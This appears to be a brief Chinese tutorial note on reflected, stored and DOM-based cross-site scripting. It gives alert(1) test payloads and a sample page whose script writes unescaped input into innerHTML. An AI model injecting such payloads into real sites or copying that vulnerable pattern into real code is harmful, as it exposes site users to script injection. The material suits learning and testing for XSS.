**反射型**
输入在一个类似于登录窗口的位置
```JS
<script>alert(1)</script>
```
显示一个带 1 的弹窗

**存储型**
输入在博客的评论区
```JS
<script>alert(1)</script>
```
返回评论区时，会有个一个 1 的弹窗

**DOM型**
```JS
"><svg onload=alert(1)>
```
一般的JavaScript对文件操作的代码
```HTML
<script>
function test(){
var str = document.getElementById("text").value; document.getElementById("t").innerHTML = "<a
href='"+str+"'>testLink</a>";
}
</script>
<div id="t"></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick="test()" />
```